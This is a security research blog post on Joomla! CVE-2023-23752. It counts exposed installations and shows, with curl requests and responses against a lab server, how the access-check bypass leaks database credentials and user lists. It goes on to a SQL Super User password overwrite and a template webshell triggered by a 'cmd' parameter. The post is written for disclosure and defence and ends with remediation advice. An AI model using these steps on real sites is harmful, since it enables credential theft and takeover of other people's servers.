---
title: "Joomla CVE-2023-23752 to Code Execution - Blog - VulnCheck"
date: 2023-03-23T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Joomla CVE-2023-23752 to Code Execution - Blog - VulnCheck

<br/>

<br/>
On February 16, 2023, Joomla! published a \[security advisory\](https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html) for \[CVE-2023-23752\](https://nvd.nist.gov/vuln/detail/CVE-2023-23752). The advisory describes an “improper access check” affecting Joomla! 4.0.0 through 4.2.7. The following day, a \[chinese-language blog shared\](https://xz.aliyun.com/t/12175) the technical details of the vulnerability. The blog describes an authentication bypass that allows an attacker to leak privileged information. \\n\\nThe blog’s disclosure was followed by a \[stream of exploits\](https://github.com/search?q=CVE-2023-23752&type=repositories) hitting GitHub, and \[multiple\](https://isc.sans.edu/diary/rss/29614) \[indicators\](https://viz.greynoise.io/tag/joomla-credential-disclosure-cve-2023-23752-attempt?days=30) of exploitation in the wild. The public exploits focus on leaking the victim’s MySQL database credentials – an unexciting prospect (we thought), because exposing the database to the internet is a dangerous misconfiguration. Nonetheless, attackers seemed interested in the vulnerability, so we sought to find out why.\\n\\n## Joomla! Versions in the Wild\\n\\nThe importance of a vulnerability is often linked to the number of affected internet-facing systems. \[A\](https://www.shodan.io/search?query=http.component%3A%22Joomla%22) \[couple\](https://www.shodan.io/search?query=html%3A%22Joomla%21+-+Open+Source+Content+Management%22) Shodan queries find approximately 50,000 internet-facing Joomla! Instances. \[Censys\](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per\_page=25&virtual\_hosts=INCLUDE&q=services.http.response.body%3A%22Joomla%21+-+Open+Source+Content+Management%22), with virtual hosts included, puts that number closer to 1.3 million installations. We only have access to the Shodan data though, so we continue with that for the remainder of this writeup.\\n\\nA Joomla! installation’s version can be remotely extracted without authentication by querying one of a few different endpoints. Joomla! version 4 exposes version information in the \`/language/en-GB/langmetadata.xml\` endpoint. Additionally, most, if not all, Joomla! Instances expose their version in the \`/administrator/manifests/files/joomla.xml\` endpoint (retrievable without authentication, despite the pathname). We scanned the IP addresses indexed by Shodan and found that Joomla! 4 is not very popular. Only about 14% of responding Joomla! instances used version 4, the only version affected by CVE-2023-23752.\\n\\n> Joomla! Major Versions in the Wild\\n\\n::bar-chart\\n---\\nlabels:\\n - 1\\n - 2\\n - 3\\n - 4\\nvalues:\\n - 205\\n - 2827\\n - 25061\\n - 4597\\n---\\n::\\n\\nFewer than 5000 internet-facing installations is hard to get excited about. But what’s even worse for attackers, is that only ~1500 (or 4% of the responding Joomla! servers) remain vulnerable to the attack.\\n\\n> Joomla! Version 4 Versions in the Wild\\n\\n::bar-chart\\n---\\nlabels:\\n - 4.3.0\\n - 4.2.9\\n - 4.2.8\\n - 4.2.7\\n - 4.2.6\\n - 4.2.5\\n - 4.2.4\\n - 4.2.3\\n - 4.2.2\\n - 4.2.1\\n - 4.2.0\\n - 4.1.5\\n - 4.1.4\\n - 4.1.3\\n - 4.1.2\\n - 4.1.1\\n - 4.1.0\\n - 4.0.6\\n - 4.0.5\\n - 4.0.4\\n - 4.0.3\\n - 4.0.2\\n - 4.0.1\\n - 4.0.0\\nvalues:\\n - 3\\n - 984\\n - 876\\n - 214\\n - 429\\n - 198\\n - 104\\n - 133\\n - 101\\n - 25\\n - 38\\n - 794\\n - 92\\n - 39\\n - 116\\n - 1\\n - 104\\n - 73\\n - 53\\n - 106\\n - 82\\n - 15\\n - 2\\n - 15\\n---\\n::\\n\\nWhich means, despite continued interest from attackers, this vulnerability has almost run its course just a month after disclosure.\\n\\nBased on the versions of the internet-facing Joomla!, we believe this vulnerability, while dangerous, was never a huge issue (nothing approaching \[Drupelgaddon\](https://www.rapid7.com/blog/post/2018/04/27/drupalgeddon-vulnerability-what-is-it-are-you-impacted/) at least). So what about this vulnerability has attackers so excited that they are \*still\* landing new exploits on GitHub?\\n\\n## CVE-2023-23752 to Code Execution #1\\n\\nAs discussed, CVE-2023-23752 is an authentication bypass resulting in an information leak. Most of the public exploits use the bypass to leak the system's configuration, which contains the Joomla! MySQL database credentials in plaintext. The following demonstrates the leak:\\n\\n\`\`\`sh\\ncurl -v http://10.9.49.205/api/index.php/v1/config/application?public=true\\n\* Trying 10.9.49.205:80...\\n\* TCP\_NODELAY set\\n\* Connected to 10.9.49.205 (10.9.49.205) port 80 (#0)\\n> GET /api/index.php/v1/config/application?public=true HTTP/1.1\\n> Host: 10.9.49.205\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n>\\n\* Mark bundle as not supporting multiuse\\n< HTTP/1.1 200 OK\\n< Date: Mon, 20 Mar 2023 15:14:05 GMT\\n< Server: Apache/2.4.41 (Ubuntu)\\n< x-frame-options: SAMEORIGIN\\n< referrer-policy: strict-origin-when-cross-origin\\n< cross-origin-opener-policy: same-origin\\n< X-Powered-By: JoomlaAPI/1.0\\n< Expires: Wed, 17 Aug 2005 00:00:00 GMT\\n< Last-Modified: Mon, 20 Mar 2023 15:14:05 GMT\\n< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\\n< Pragma: no-cache\\n< Content-Length: 1983\\n< Content-Type: application/vnd.api+json; charset=utf-8\\n<\\n{"links":{"self":"http:\\/\\/10.9.49.205\\/api\\/index.php\\/v1\\/config\\/application?public=true","next":"http:\\/\\/10.9.49.205\\/api\\/index.php\\/v1\\/config\\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\\/\\/10.9.49.205\\/api\\/index.php\\/v1\\/config\\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":\[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline\_message":"This site is down for maintenance.  
Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display\_offline\_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline\_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"vulncheck","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list\_limit":20,"i\* Connection #0 to host 10.9.49.205 left intact\\nd":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug\_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug\_lang\_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"root","id":224}},{"type":"application","id":"224","attributes":{"password":"labpass1","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla\_db","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"xj3n0\_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}\],"meta":{"total-pages":4}}\\n\`\`\`\\n\\nIn the proof of concept above, the server responds with the credentials \`root:labpass1\`, which are the credentials for our test Joomla! MySQL account. But it’s important to know that our test MySQL server was bound to \`127.0.0.1\`, so the remote attacker can’t access the server, making the credentials mostly useless. Binding MySQL to the localhost should be the most common configuration, which severely limits this credential leak.\\n\\nHowever, it appears there are a good number of internet-facing Joomla! installations that use a MySQL server that \*isn’t\* bound to \`127.0.0.1\`. Censys shows thousands of Joomla! Servers colocated with an exposed MySQL server.\\n\\n!\[Censys query with both MySQL and Joomla\](/blog/joomla-for-rce/censys-joomla-mysql.png){:width="100%"}\\n\\nAn attacker with credentials to the MySQL server won’t automatically be able to execute arbitrary code. Old MySQL \[attack techniques\](https://sqlwiki.netspi.com/attackQueries/readingAndWritingFiles/#mysql) that manipulate local files should be unusable on any modern and/or decently configured server. But access to the MySQL server should still provide a path to code execution.\\n\\nAccess to the database allows the attacker to change the Joomla! Super User’s password. Joomla! even \[documents\](https://docs.joomla.org/How\_do\_you\_recover\_or\_reset\_your\_admin\_password%3F#Change\_the\_Password\_in\_the\_Database) how this can be done using only database access. The following demonstrates the password change to “secret” using the MySQL client.\\n\\n\`\`\`sh\\nmysql> use joomla\_db;\\nReading table information for completion of table and column names\\nYou can turn off this feature to get a quicker startup with -A\\n\\nDatabase changed\\nmysql> show tables;\\n+-------------------------------+\\n| Tables\_in\_joomla\_db |\\n+-------------------------------+\\n| xj3n0\_action\_log\_config |\\n| xj3n0\_action\_logs \\n… truncated …\\nmysql> select \* from xj3n0\_users;\\n+-----+------+---------------+-----------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+\\n| id | name | username | email | password | block | sendEmail | registerDate | lastvisitDate | activation | params | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |\\n+-----+------+---------------+-----------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+\\n| 552 | jake | albinolobster | albinolobster@vulncheck.com | $2y$10$GL9tEHKez5Wa6sr2CjXXmetAr6cOOo7DpE9j1KaeJCIy1UwnaYUVO | 0 | 1 | 2023-03-17 15:07:45 | 2023-03-17 16:41:04 | 0 | | NULL | 0 | | | 0 | |\\n+-----+------+---------------+-----------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+--------+---------------+------------+--------+------+--------------+--------------+\\n1 row in set (0.00 sec)\\n\\nmysql> Update xj3n0\_users SET password = "d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199" WHERE id=552;\\nQuery OK, 1 row affected (0.00 sec)\\nRows matched: 1 Changed: 1 Warnings: 0\\n\\nmysql>\\n\`\`\`\\n\\nThe attacker can then log into the Joomla! administrative web interface. As the Super User, the attacker has two easy paths to execute arbitrary code.\\n\\n1. \[Modify a template\](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla) to include malicious PHP. The image below demonstrates the addition of a tiny webshell to \`index.php\`. This will allow the attacker to execute arbitrary code as the \`www-data\` user by sending requests to the instance’s landing page (e.g. \`curl -k http://10.9.49.205/?cmd=whoami\`)\\n\\n!\[Joomla! Webshell in Template Editor\](/blog/joomla-for-rce/joomla-webshell.png){:width="100%"}\\n\\n2. Install a malicious plugin such as \[Joomla-webshell-plugin\](https://github.com/p0dalirius/Joomla-webshell-plugin).\\n\\nBoth are viable options. Both are achievable because the MySQL credential leak allows the attacker to take over a Super User account. That isn’t the only way though. CVE-2023-23752 provides a second method for chasing after a Super User account.\\n\\n## CVE-2023-23752 to Code Execution #2\\n\\nInstead of leaking the MySQL credentials, the attacker can leak the Joomla! user database using CVE-2023-23752:\\n\\n\`\`\`sh\\ncurl -v http://10.9.49.205/api/index.php/v1/users?public=true\\n\* Trying 10.9.49.205:80...\\n\* TCP\_NODELAY set\\n\* Connected to 10.9.49.205 (10.9.49.205) port 80 (#0)\\n> GET /api/index.php/v1/users?public=true HTTP/1.1\\n> Host: 10.9.49.205\\n> User-Agent: curl/7.68.0\\n> Accept: \*/\*\\n>\\n\* Mark bundle as not supporting multiuse\\n< HTTP/1.1 200 OK\\n< Date: Mon, 20 Mar 2023 16:11:38 GMT\\n< Server: Apache/2.4.41 (Ubuntu)\\n< x-frame-options: SAMEORIGIN\\n< referrer-policy: strict-origin-when-cross-origin\\n< cross-origin-opener-policy: same-origin\\n< X-Powered-By: JoomlaAPI/1.0\\n< Expires: Wed, 17 Aug 2005 00:00:00 GMT\\n< Last-Modified: Mon, 20 Mar 2023 16:11:38 GMT\\n< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\\n< Pragma: no-cache\\n< Content-Length: 418\\n< Content-Type: application/vnd.api+json; charset=utf-8\\n<\\n\* Connection #0 to host 10.9.49.205 left intact\\n{"links":{"self":"http:\\/\\/10.9.49.205\\/api\\/index.php\\/v1\\/users?public=true"},"data":\[{"type":"users","id":"552","attributes":{"id":552,"name":"jake","username":"albinolobster","email":"albinolobster@vulncheck.com","block":0,"sendEmail":1,"registerDate":"2023-03-17 15:07:45","lastvisitDate":"2023-03-20 15:35:58","lastResetTime":null,"resetCount":0,"group\_count":1,"group\_names":"Super Users"}}\],"meta":{"total-pages":1}\\n\`\`\`\\n\\nThe database output contains usernames, emails, and assigned group (e.g. \`Super Users\`). This should be enough for credential stuffing or \[brute forcing\](https://github.com/ajnik/joomla-bruteforce) to achieve Super User access. Some bad administrators might even reuse the MySQL password for the Super User account. Either way, this additional leak has the added benefit of not relying on MySQL being reachable. Once Super User access is achieved, the attacker can follow the previously discussed paths to code execution.\\n\\n\\n## Conclusion\\n\\nCVE-2023-23752 is an authentication bypass resulting in an information leak on Joomla! Servers. Although rated as a CVSSv3 5.3 (Medium severity) by \[NVD\](https://nvd.nist.gov/vuln/detail/CVE-2023-23752), this vulnerability could allow an attacker to achieve code execution under the right circumstances. That likely justifies the interest attackers have shown in this vulnerability.\\n\\nThe total number of vulnerable servers was never high and patching has occurred at a good rate. However, anyone using Joomla! Version 4 should probably consider rotating all passwords. Additionally, examining template files for webshells and auditing all installed plugins would be beneficial.\\n

#### [Source](https://vulncheck.com/blog/joomla-for-rce)

<br/>
---
